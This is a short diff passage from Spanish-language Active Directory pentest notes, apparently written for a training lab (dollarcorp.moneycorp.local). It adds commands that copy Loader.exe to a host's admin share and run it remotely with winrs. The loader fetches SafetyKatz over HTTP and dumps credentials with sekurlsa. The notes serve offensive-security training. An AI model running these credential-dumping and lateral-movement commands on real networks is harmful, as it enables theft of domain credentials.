@@ -331,4 +331,12 @@ Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
 
 Encontrando usuarios como *adminsrv* y *mgmt* teniendo como resultado que tenemos acceso como usuario Administrador en *mgmt* como *srvadmin* además ya sabemos que hay una sesión activa en ese host con un usuario *svcadmin*
 
-Ahora vamos a extraer las credenciales de e
+Ahora vamos a extraer las credenciales de la maquina usando *SafetyKatz* primero tendremos que cargar el archivo *Loader.exe* a *mgmt*
+```shell
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+Una vez hemos cargado el archivo extraeremos las credenciales usando
+```shell
+winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
+```
